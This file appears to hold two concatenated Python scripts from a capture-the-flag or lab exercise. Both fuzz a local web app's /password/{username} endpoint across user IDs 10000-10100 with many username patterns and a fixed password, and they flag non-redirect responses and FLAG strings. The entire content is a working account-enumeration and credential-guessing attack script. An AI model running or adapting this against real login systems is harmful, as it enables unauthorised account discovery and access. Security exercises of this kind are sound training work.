import requests
import re

# Target configuration
BASE_URL = "http://127.0.0.1:32948"
PASSWORD = "test"

# Test range 10000-10100 with various username patterns
START_ID = 10030
END_ID = 10040  # Focus on the area around known valid ID 10032 first

# Username patterns to try
patterns = [
    "user{id}",   # user10032
    "u{id}",      # u10032
    "account{id}",
    "admin{id}",
    "test{id}",
    "{id}",       # Just the number
]

print(f"[ALTERNATIVE FUZZING] Testing user_id range {START_ID}-{END_ID}")
print(f"[STRATEGY] Try username patterns that incorporate user_id")
print("-" * 60)

found_accounts = []

# First, try optimized username patterns
for user_id in range(START_ID, END_ID + 1):
    # Try the pattern "user{id}" which is very common
    username = f"user{user_id}"
    endpoint = f"/password/{username}"
    
    try:
        data = {
            "username": username,
            "user_id": str(user_id),
            "password": PASSWORD
        }
        
        resp = requests.post(
            f"{BASE_URL}{endpoint}",
            data=data,
            allow_redirects=False,
            timeout=5
        )
        
        # Only report non-302 responses
        if resp.status_code != 302:
            print(f"\n[!] MATCH FOUND!")
            print(f"    user_id: {user_id}")
            print(f"    username: {username}")
            print(f"    endpoint: {endpoint}")
            print(f"    status: {resp.status_code}")
            print(f"    response: {resp.text[:500]}")
            
            # Check for FLAG in response
            flags = re.findall(r'FLAG\{[^}]+\}', resp.text, re.IGNORECASE)
            if flags:
                print(f"    [!] FLAGS: {flags}")
                
            found_accounts.append({
                "user_id": user_id,
                "username": username,
                "status": resp.status_code,
                "flags": flags
            })
            
    except Exception as e:
        print(f"[ERROR] {user_id}: {e}")

# Expand to full range with successful pattern if found, or try other patterns
print("\n" + "=" * 60)
if not found_accounts:
    print("[EXPANDING] Testing full range 10000-10100 with 'user{id}' pattern...")
    for user_id in range(10000, 10101):
        username = f"user{user_id}"
        endpoint = f"/password/{username}"
        
        try:
            data = {
                "username": username,
                "user_id": str(user_id),
                "password": PASSWORD
            }
            
            resp = requests.post(
                f"{BASE_URL}{endpoint}",
                data=data,
                allow_redirects=False,
                timeout=5
            )
            
            if resp.status_code != 302:
                print(f"\n[!] APPENDIX - Found: username={username}, user_id={user_id}, status={resp.status_code}")
                flags = re.findall(r'FLAG\{[^}]+\}', resp.text, re.IGNORECASE)
                if flags:
                    print(f"    [FLAGS: {flags}]")
                found_accounts.append({
                    "user_id": user_id,
                    "username": username,
                    "status": resp.status_code,
                    "flags": flags
                })
                
        except Exception as e:
            pass
            
        if (user_id - 10000) % 50 == 0:
            print(f"  Progress... user_id={user_id}")

# Final summary
print("\n" + "=" * 60)
print("[FINAL RESULTS]")
print(f"Accounts found: {len(found_accounts)}")
for acc in found_accounts:
    print(f"  - user_id={acc['user_id']}, username={acc['username']}, status={acc['status']}")
    if acc['flags']:
        print(f"    FLAGS: {acc['flags']}")

if not found_accounts:
    print("[CONCLUSION] No additional valid accounts found with 'user{id}' pattern")
    print("[SUGGESTION] The valid account 'test' with user_id=10032 may be the only")
    print("             account in this range, or usernames follow a different pattern")

import requests
import re

# Target configuration
BASE_URL = "http://127.0.0.1:32948"
PASSWORD = "test"

# More aggressive fuzzing - try multiple username patterns
patterns = [
    "u{id}",           # u10032
    "id{id}",          # id10032
    "account{id}",
    "member{id}",
    "trader{id}",
    "player{id}",
    "admin{id}",
    "test{id}",
    "{id}user",        # 10032user
    "{id}test",        # 10032test
    "user_{id}",       # user_10032
    "account_{id}",
    "member_{id}",
]

print("[PATTERN FUZZING] Testing 10000-10100 with multiple username patterns")
print("-" * 60)

found_accounts = []
extended_patterns = []

# Focus range around the known working ID (10032)
for user_id in range(10000, 10101):
    for pattern in patterns:
        username = pattern.format(id=user_id)
        endpoint = f"/password/{username}"
        
        try:
            data = {
                "username": username,
                "user_id": str(user_id),
                "password": PASSWORD
            }
            
            resp = requests.post(
                f"{BASE_URL}{endpoint}",
                data=data,
                allow_redirects=False,
                timeout=3
            )
            
            if resp.status_code != 302:
                print(f"\n[!] FOUND: username={username}, user_id={user_id}")
                print(f"    Status: {resp.status_code}")
                print(f"    Response: {resp.text[:300]}")
                
                flags = re.findall(r'FLAG\{[^}]+\}', resp.text, re.IGNORECASE)
                if flags:
                    print(f"    [!] FLAGS: {flags}")
                    
                found_accounts.append({
                    "user_id": user_id,
                    "username": username,
                    "status": resp.status_code,
                    "flags": flags
                })
                extended_patterns.append(pattern)
                
        except Exception as e:
            pass
    
    if (user_id - 10000) % 100 == 0:
        print(f"  Progress: user_id={user_id}")

# Summary
print("\n" + "=" * 60)
print("[FINAL SUMMARY]")
print(f"Total requests: {10100 - 10000 + 1} user_ids × {len(patterns)} patterns = {(10100-10000+1)*len(patterns)}")
print(f"Valid accounts found: {len(found_accounts)}")

if found_accounts:
    for acc in found_accounts:
        print(f"  - user_id={acc['user_id']}, username={acc['username']}, status={acc['status']}")
        if acc['flags']:
            print(f"    FLAGS: {acc['flags']}")
else:
    print("\n[CONCLUSION] No additional valid accounts found")
    print("[ASSESSMENT] The user_ids 10000-10100 likely don't exist or use a different")
    print("             username scheme than the tested patterns")

